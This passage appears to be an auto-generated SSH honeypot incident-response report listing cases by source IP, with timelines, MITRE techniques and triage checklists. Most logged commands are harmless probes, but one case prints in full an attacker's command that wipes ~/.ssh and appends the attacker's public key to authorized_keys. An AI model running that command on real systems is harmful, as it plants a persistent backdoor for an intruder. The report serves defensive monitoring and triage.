| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_16e6595095d349f398ab15ab1409fb6f_small_control'"'"' '"'"'check_16e6595095d349f398ab15ab1409fb6f'"'"'', printf '\n%s|%s\n' 'check_16e6595095d349f398ab15ab1409fb6f_small_control' 'check_16e6595095d349f398ab15ab1409fb6f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_16e6595095d349f398ab15ab1409fb6f_small_math'"'"' "$((878*72+43))"', (878*72+43, printf '\n%s|%s\n' 'check_16e6595095d349f398ab15ab1409fb6f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:35:12` | `cowrie.session.connect` |
| `2026-11-10 01:35:12` | `cowrie.client.version` |
| `2026-11-10 01:35:12` | `cowrie.client.kex` |
| `2026-11-10 01:35:13` | `cowrie.login.success` |
| `2026-11-10 01:35:14` | `cowrie.client.size` |
| `2026-11-10 01:35:14` | `cowrie.session.params` |
| `2026-11-10 01:35:14` | `cowrie.command.input` |
| `2026-11-10 01:35:14` | `cowrie.command.input` |
| `2026-11-10 01:35:14` | `cowrie.command.input` |
| `2026-11-10 01:35:14` | `cowrie.command.input` |
| `2026-11-10 01:35:14` | `cowrie.command.input` |
| `2026-11-10 01:35:14` | `cowrie.command.input` |
| `2026-11-10 01:35:14` | `cowrie.command.input` |
| `2026-11-10 01:35:14` | `cowrie.command.input` |
| `2026-11-10 01:35:14` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b15fa702a85

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:37 |
| **Last Seen** | 2026-11-10 01:38 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6c65aec2958db49ef03d2e61ce82bc01_small_control'"'"' '"'"'check_6c65aec2958db49ef03d2e61ce82bc01'"'"'', printf '\n%s|%s\n' 'check_6c65aec2958db49ef03d2e61ce82bc01_small_control' 'check_6c65aec2958db49ef03d2e61ce82bc01', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6c65aec2958db49ef03d2e61ce82bc01_small_math'"'"' "$((831*144+8))"', (831*144+8, printf '\n%s|%s\n' 'check_6c65aec2958db49ef03d2e61ce82bc01_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:37:51` | `cowrie.session.connect` |
| `2026-11-10 01:37:51` | `cowrie.client.version` |
| `2026-11-10 01:37:51` | `cowrie.client.kex` |
| `2026-11-10 01:37:52` | `cowrie.login.success` |
| `2026-11-10 01:37:53` | `cowrie.client.size` |
| `2026-11-10 01:37:53` | `cowrie.session.params` |
| `2026-11-10 01:37:53` | `cowrie.command.input` |
| `2026-11-10 01:37:53` | `cowrie.command.input` |
| `2026-11-10 01:37:53` | `cowrie.command.input` |
| `2026-11-10 01:37:53` | `cowrie.command.input` |
| `2026-11-10 01:37:53` | `cowrie.command.input` |
| `2026-11-10 01:37:53` | `cowrie.command.input` |
| `2026-11-10 01:37:53` | `cowrie.command.input` |
| `2026-11-10 01:37:53` | `cowrie.command.input` |
| `2026-11-10 01:37:53` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-168ddf09fb37

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:40 |
| **Last Seen** | 2026-11-10 01:41 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8e262b2d82149b8bbac8fc3d489307fe_small_control'"'"' '"'"'check_8e262b2d82149b8bbac8fc3d489307fe'"'"'', printf '\n%s|%s\n' 'check_8e262b2d82149b8bbac8fc3d489307fe_small_control' 'check_8e262b2d82149b8bbac8fc3d489307fe', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8e262b2d82149b8bbac8fc3d489307fe_small_math'"'"' "$((499*153+16))"', (499*153+16, printf '\n%s|%s\n' 'check_8e262b2d82149b8bbac8fc3d489307fe_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:40:32` | `cowrie.session.connect` |
| `2026-11-10 01:40:32` | `cowrie.client.version` |
| `2026-11-10 01:40:32` | `cowrie.client.kex` |
| `2026-11-10 01:40:34` | `cowrie.login.success` |
| `2026-11-10 01:40:35` | `cowrie.client.size` |
| `2026-11-10 01:40:35` | `cowrie.session.params` |
| `2026-11-10 01:40:35` | `cowrie.command.input` |
| `2026-11-10 01:40:35` | `cowrie.command.input` |
| `2026-11-10 01:40:35` | `cowrie.command.input` |
| `2026-11-10 01:40:35` | `cowrie.command.input` |
| `2026-11-10 01:40:35` | `cowrie.command.input` |
| `2026-11-10 01:40:35` | `cowrie.command.input` |
| `2026-11-10 01:40:35` | `cowrie.command.input` |
| `2026-11-10 01:40:35` | `cowrie.command.input` |
| `2026-11-10 01:40:35` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3b564536c01

| Field | Detail |
|---|---|
| **Source IP** | `115.190.165[.]165` |
| **First Seen** | 2026-11-10 01:40 |
| **Last Seen** | 2026-11-10 01:45 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:40:50` | `cowrie.session.connect` |
| `2026-11-10 01:40:50` | `cowrie.client.version` |
| `2026-11-10 01:40:51` | `cowrie.client.kex` |
| `2026-11-10 01:40:51` | `cowrie.login.success` |
| `2026-11-10 01:45:51` | `cowrie.session.file_upload` |
| `2026-11-10 01:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.165[.]165` to AbuseIPDB if not already reported
- [ ] Block `115.190.165[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea988358e31d

| Field | Detail |
|---|---|
| **Source IP** | `191.178.223[.]110` |
| **First Seen** | 2026-11-10 01:41 |
| **Last Seen** | 2026-11-10 01:42 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:41:24` | `cowrie.session.connect` |
| `2026-11-10 01:41:24` | `cowrie.client.version` |
| `2026-11-10 01:41:25` | `cowrie.client.kex` |
| `2026-11-10 01:41:25` | `cowrie.login.success` |
| `2026-11-10 01:42:07` | `cowrie.session.file_upload` |
| `2026-11-10 01:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.178.223[.]110` to AbuseIPDB if not already reported
- [ ] Block `191.178.223[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e28b582ad3f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:43 |
| **Last Seen** | 2026-11-10 01:43 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5b7e41368259054bb2e1000a2dc8c74e_small_control'"'"' '"'"'check_5b7e41368259054bb2e1000a2dc8c74e'"'"'', printf '\n%s|%s\n' 'check_5b7e41368259054bb2e1000a2dc8c74e_small_control' 'check_5b7e41368259054bb2e1000a2dc8c74e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5b7e41368259054bb2e1000a2dc8c74e_small_math'"'"' "$((492*839+46))"', (492*839+46, printf '\n%s|%s\n' 'check_5b7e41368259054bb2e1000a2dc8c74e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:43:04` | `cowrie.session.connect` |
| `2026-11-10 01:43:04` | `cowrie.client.version` |
| `2026-11-10 01:43:04` | `cowrie.client.kex` |
| `2026-11-10 01:43:05` | `cowrie.login.success` |
| `2026-11-10 01:43:06` | `cowrie.client.size` |
| `2026-11-10 01:43:06` | `cowrie.session.params` |
| `2026-11-10 01:43:06` | `cowrie.command.input` |
| `2026-11-10 01:43:06` | `cowrie.command.input` |
| `2026-11-10 01:43:06` | `cowrie.command.input` |
| `2026-11-10 01:43:06` | `cowrie.command.input` |
| `2026-11-10 01:43:06` | `cowrie.command.input` |
| `2026-11-10 01:43:06` | `cowrie.command.input` |
| `2026-11-10 01:43:06` | `cowrie.command.input` |
| `2026-11-10 01:43:06` | `cowrie.command.input` |
| `2026-11-10 01:43:06` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d26a0293200

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:45 |
| **Last Seen** | 2026-11-10 01:46 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ce97b82955f9a21bec6c0927cb8a5b0a_small_control'"'"' '"'"'check_ce97b82955f9a21bec6c0927cb8a5b0a'"'"'', printf '\n%s|%s\n' 'check_ce97b82955f9a21bec6c0927cb8a5b0a_small_control' 'check_ce97b82955f9a21bec6c0927cb8a5b0a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ce97b82955f9a21bec6c0927cb8a5b0a_small_math'"'"' "$((47*569+23))"', (47*569+23, printf '\n%s|%s\n' 'check_ce97b82955f9a21bec6c0927cb8a5b0a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:45:32` | `cowrie.session.connect` |
| `2026-11-10 01:45:32` | `cowrie.client.version` |
| `2026-11-10 01:45:32` | `cowrie.client.kex` |
| `2026-11-10 01:45:32` | `cowrie.login.success` |
| `2026-11-10 01:45:33` | `cowrie.client.size` |
| `2026-11-10 01:45:34` | `cowrie.session.params` |
| `2026-11-10 01:45:34` | `cowrie.command.input` |
| `2026-11-10 01:45:34` | `cowrie.command.input` |
| `2026-11-10 01:45:34` | `cowrie.command.input` |
| `2026-11-10 01:45:34` | `cowrie.command.input` |
| `2026-11-10 01:45:34` | `cowrie.command.input` |
| `2026-11-10 01:45:34` | `cowrie.command.input` |
| `2026-11-10 01:45:34` | `cowrie.command.input` |
| `2026-11-10 01:45:34` | `cowrie.command.input` |
| `2026-11-10 01:45:34` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4fec2ea8c7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:48 |
| **Last Seen** | 2026-11-10 01:48 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_39f30d5e0d48b61e582df224c19c4fce_small_control'"'"' '"'"'check_39f30d5e0d48b61e582df224c19c4fce'"'"'', printf '\n%s|%s\n' 'check_39f30d5e0d48b61e582df224c19c4fce_small_control' 'check_39f30d5e0d48b61e582df224c19c4fce', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_39f30d5e0d48b61e582df224c19c4fce_small_math'"'"' "$((878*450+92))"', (878*450+92, printf '\n%s|%s\n' 'check_39f30d5e0d48b61e582df224c19c4fce_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:48:00` | `cowrie.session.connect` |
| `2026-11-10 01:48:00` | `cowrie.client.version` |
| `2026-11-10 01:48:00` | `cowrie.client.kex` |
| `2026-11-10 01:48:02` | `cowrie.login.success` |
| `2026-11-10 01:48:03` | `cowrie.client.size` |
| `2026-11-10 01:48:04` | `cowrie.session.params` |
| `2026-11-10 01:48:04` | `cowrie.command.input` |
| `2026-11-10 01:48:04` | `cowrie.command.input` |
| `2026-11-10 01:48:04` | `cowrie.command.input` |
| `2026-11-10 01:48:04` | `cowrie.command.input` |
| `2026-11-10 01:48:04` | `cowrie.command.input` |
| `2026-11-10 01:48:04` | `cowrie.command.input` |
| `2026-11-10 01:48:04` | `cowrie.command.input` |
| `2026-11-10 01:48:04` | `cowrie.command.input` |
| `2026-11-10 01:48:04` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee5f8d163100

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:50 |
| **Last Seen** | 2026-11-10 01:51 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_23554d77aa3b0ca303ecbd3f16e818d6_small_control'"'"' '"'"'check_23554d77aa3b0ca303ecbd3f16e818d6'"'"'', printf '\n%s|%s\n' 'check_23554d77aa3b0ca303ecbd3f16e818d6_small_control' 'check_23554d77aa3b0ca303ecbd3f16e818d6', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_23554d77aa3b0ca303ecbd3f16e818d6_small_math'"'"' "$((73*12+25))"', (73*12+25, printf '\n%s|%s\n' 'check_23554d77aa3b0ca303ecbd3f16e818d6_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:50:20` | `cowrie.session.connect` |
| `2026-11-10 01:50:20` | `cowrie.client.version` |
| `2026-11-10 01:50:20` | `cowrie.client.kex` |
| `2026-11-10 01:50:21` | `cowrie.login.success` |
| `2026-11-10 01:50:23` | `cowrie.client.size` |
| `2026-11-10 01:50:23` | `cowrie.session.params` |
| `2026-11-10 01:50:23` | `cowrie.command.input` |
| `2026-11-10 01:50:23` | `cowrie.command.input` |
| `2026-11-10 01:50:23` | `cowrie.command.input` |
| `2026-11-10 01:50:23` | `cowrie.command.input` |
| `2026-11-10 01:50:23` | `cowrie.command.input` |
| `2026-11-10 01:50:23` | `cowrie.command.input` |
| `2026-11-10 01:50:23` | `cowrie.command.input` |
| `2026-11-10 01:50:23` | `cowrie.command.input` |
| `2026-11-10 01:50:23` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-629162b18968

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:52 |
| **Last Seen** | 2026-11-10 01:53 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b472ec858bb34d06625873ef2f9cc8cc_small_control'"'"' '"'"'check_b472ec858bb34d06625873ef2f9cc8cc'"'"'', printf '\n%s|%s\n' 'check_b472ec858bb34d06625873ef2f9cc8cc_small_control' 'check_b472ec858bb34d06625873ef2f9cc8cc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b472ec858bb34d06625873ef2f9cc8cc_small_math'"'"' "$((333*99+23))"', (333*99+23, printf '\n%s|%s\n' 'check_b472ec858bb34d06625873ef2f9cc8cc_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:52:32` | `cowrie.session.connect` |
| `2026-11-10 01:52:32` | `cowrie.client.version` |
| `2026-11-10 01:52:32` | `cowrie.client.kex` |
| `2026-11-10 01:52:34` | `cowrie.login.success` |
| `2026-11-10 01:52:35` | `cowrie.client.size` |
| `2026-11-10 01:52:35` | `cowrie.session.params` |
| `2026-11-10 01:52:35` | `cowrie.command.input` |
| `2026-11-10 01:52:35` | `cowrie.command.input` |
| `2026-11-10 01:52:35` | `cowrie.command.input` |
| `2026-11-10 01:52:35` | `cowrie.command.input` |
| `2026-11-10 01:52:35` | `cowrie.command.input` |
| `2026-11-10 01:52:35` | `cowrie.command.input` |
| `2026-11-10 01:52:36` | `cowrie.command.input` |
| `2026-11-10 01:52:36` | `cowrie.command.input` |
| `2026-11-10 01:52:36` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd597f78db8c

| Field | Detail |
|---|---|
| **Source IP** | `173.244.60[.]241` |
| **First Seen** | 2026-11-10 01:52 |
| **Last Seen** | 2026-11-10 01:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:52:40` | `cowrie.session.connect` |
| `2026-11-10 01:52:40` | `cowrie.client.version` |
| `2026-11-10 01:52:40` | `cowrie.client.kex` |
| `2026-11-10 01:52:40` | `cowrie.login.success` |
| `2026-11-10 01:52:41` | `cowrie.session.params` |
| `2026-11-10 01:52:41` | `cowrie.command.input` |
| `2026-11-10 01:52:41` | `cowrie.command.failed` |
| `2026-11-10 01:52:41` | `cowrie.log.closed` |
| `2026-11-10 01:52:41` | `cowrie.session.params` |
| `2026-11-10 01:52:41` | `cowrie.command.input` |
| `2026-11-10 01:52:41` | `cowrie.session.file_download` |
| `2026-11-10 01:52:41` | `cowrie.log.closed` |
| `2026-11-10 01:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.244.60[.]241` to AbuseIPDB if not already reported
- [ ] Block `173.244.60[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9534d4b7b4

| Field | Detail |
|---|---|
| **Source IP** | `173.244.60[.]241` |
| **First Seen** | 2026-11-10 01:52 |
| **Last Seen** | 2026-11-10 01:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:52:41` | `cowrie.session.connect` |
| `2026-11-10 01:52:41` | `cowrie.client.version` |
| `2026-11-10 01:52:41` | `cowrie.client.kex` |
| `2026-11-10 01:52:42` | `cowrie.login.success` |
| `2026-11-10 01:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.244.60[.]241` to AbuseIPDB if not already reported
- [ ] Block `173.244.60[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-536ae6b103ee

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:55 |
| **Last Seen** | 2026-11-10 01:55 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ad5f575cdcc9e16087479338f4db2f87_small_control'"'"' '"'"'check_ad5f575cdcc9e16087479338f4db2f87'"'"'', printf '\n%s|%s\n' 'check_ad5f575cdcc9e16087479338f4db2f87_small_control' 'check_ad5f575cdcc9e16087479338f4db2f87', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ad5f575cdcc9e16087479338f4db2f87_small_math'"'"' "$((516*563+55))"', (516*563+55, printf '\n%s|%s\n' 'check_ad5f575cdcc9e16087479338f4db2f87_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:55:19` | `cowrie.session.connect` |
| `2026-11-10 01:55:19` | `cowrie.client.version` |
| `2026-11-10 01:55:19` | `cowrie.client.kex` |
| `2026-11-10 01:55:19` | `cowrie.login.success` |
| `2026-11-10 01:55:20` | `cowrie.client.size` |
| `2026-11-10 01:55:20` | `cowrie.session.params` |
| `2026-11-10 01:55:20` | `cowrie.command.input` |
| `2026-11-10 01:55:20` | `cowrie.command.input` |
| `2026-11-10 01:55:20` | `cowrie.command.input` |
| `2026-11-10 01:55:20` | `cowrie.command.input` |
| `2026-11-10 01:55:20` | `cowrie.command.input` |
| `2026-11-10 01:55:20` | `cowrie.command.input` |
| `2026-11-10 01:55:20` | `cowrie.command.input` |
| `2026-11-10 01:55:20` | `cowrie.command.input` |
| `2026-11-10 01:55:20` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1067ab037d01

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:58 |
| **Last Seen** | 2026-11-10 01:59 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cfbd1c7b8a8d9d99e53688e0e7c4b101_small_control'"'"' '"'"'check_cfbd1c7b8a8d9d99e53688e0e7c4b101'"'"'', printf '\n%s|%s\n' 'check_cfbd1c7b8a8d9d99e53688e0e7c4b101_small_control' 'check_cfbd1c7b8a8d9d99e53688e0e7c4b101', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cfbd1c7b8a8d9d99e53688e0e7c4b101_small_math'"'"' "$((341*355+26))"', (341*355+26, printf '\n%s|%s\n' 'check_cfbd1c7b8a8d9d99e53688e0e7c4b101_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:58:56` | `cowrie.session.connect` |
| `2026-11-10 01:58:56` | `cowrie.client.version` |
| `2026-11-10 01:58:57` | `cowrie.client.kex` |
| `2026-11-10 01:58:57` | `cowrie.login.success` |
| `2026-11-10 01:58:58` | `cowrie.client.size` |
| `2026-11-10 01:58:58` | `cowrie.session.params` |
| `2026-11-10 01:58:59` | `cowrie.command.input` |
| `2026-11-10 01:58:59` | `cowrie.command.input` |
| `2026-11-10 01:58:59` | `cowrie.command.input` |
| `2026-11-10 01:58:59` | `cowrie.command.input` |
| `2026-11-10 01:58:59` | `cowrie.command.input` |
| `2026-11-10 01:58:59` | `cowrie.command.input` |
| `2026-11-10 01:58:59` | `cowrie.command.input` |
| `2026-11-10 01:58:59` | `cowrie.command.input` |
| `2026-11-10 01:58:59` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (31) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-172f5d3aeabc | HIGH | `80.94.92[.]179` | 2026-11-10 02:01 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ecff76eebfd9 | HIGH | `80.94.92[.]179` | 2026-11-10 02:03 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-db8597679375 | HIGH | `65.49.1[.]24` | 2026-11-10 02:04 | Y | 3 | 0 | `T1078` |
| IR-c4b99b71ff30 | HIGH | `80.94.92[.]179` | 2026-11-10 02:06 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8f9bfb134b78 | HIGH | `201.79.88[.]34` | 2026-11-10 02:07 | Y | 0 | 0 | `T1078` |
| IR-85c53aea98bd | HIGH | `201.79.88[.]34` | 2026-11-10 02:08 | Y | 8 | 0 | `T1078` |
| IR-491aafe9f37e | HIGH | `165.227.144[.]7` | 2026-11-10 02:08 | Y | 3 | 0 | `T1078` |
| IR-c422a2b84cc7 | HIGH | `139.59.129[.]37` | 2026-11-10 02:08 | Y | 2 | 0 | `T1078` |
| IR-f61a5bec35ef | HIGH | `80.94.92[.]179` | 2026-11-10 02:08 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7b91b0006f57 | HIGH | `80.94.92[.]179` | 2026-11-10 02:11 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ae29158a2c24 | HIGH | `176.53.159[.]196` | 2026-11-10 02:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-712d67e4f7cd | HIGH | `80.94.92[.]179` | 2026-11-10 02:15 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7468217e304e | HIGH | `35.210.42[.]189` | 2026-11-10 02:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a7d6cb0d4731 | HIGH | `193.105.131[.]7` | 2026-11-10 02:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-691bfdf734b5 | HIGH | `193.105.131[.]7` | 2026-11-10 02:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8b5b0d28218f | HIGH | `80.94.92[.]179` | 2026-11-10 02:17 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f9a5702e3293 | HIGH | `80.94.92[.]179` | 2026-11-10 02:19 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
